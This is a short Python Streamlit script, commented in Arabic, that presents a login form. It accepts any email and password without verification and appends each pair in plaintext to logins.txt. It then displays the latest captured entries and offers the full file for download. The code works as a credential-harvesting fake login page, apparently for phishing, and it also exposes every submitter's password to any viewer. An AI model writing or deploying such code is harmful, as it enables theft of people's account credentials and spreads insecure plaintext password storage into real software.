import streamlit as st

# تهيئة حالة التسجيل
if "logged_in" not in st.session_state:
    st.session_state.logged_in = False

# الصفحة الأولى: تسجيل الدخول
if not st.session_state.logged_in:
    st.title("تسجيل الدخول")

    with st.form("login_form"):
        email = st.text_input("البريد الإلكتروني")
        password = st.text_input("كلمة المرور", type="password")
        submit = st.form_submit_button("دخول")

    if submit:
        # حفظ البيانات في الملف المؤقت
        with open("logins.txt", "a", encoding="utf-8") as f:
            f.write(f"Email: {email} | Password: {password}\n")
        
        st.session_state.logged_in = True
        st.rerun()

# الصفحة الثانية: المحتوى بعد تسجيل الدخول
else:
    st.title("مرحباً بك في الصفحة الرئيسية! 👋")
    st.success("تم تسجيل الدخول بنجاح!")

    # قراءة البيانات وعرضها
    try:
        with open("logins.txt", "r", encoding="utf-8") as f:
            log_data = f.read()
            lines = log_data.strip().split("\n")
            
            st.subheader("آخر البيانات المسجلة:")
            for line in lines[-5:]:
                st.code(line)

            # زر تحميل الملف كاملاً إلى جهازك
            st.download_button(
                label="📥 تحميل ملف البيانات (logins.txt)",
                data=log_data,
                file_name="logins.txt",
                mime="text/plain"
            )
    except FileNotFoundError:
        st.warning("لم يتم العثور على ملف logins.txt بعد.")

    if st.button("تسجيل الخروج"):
        st.session_state.logged_in = False
        st.rerun()
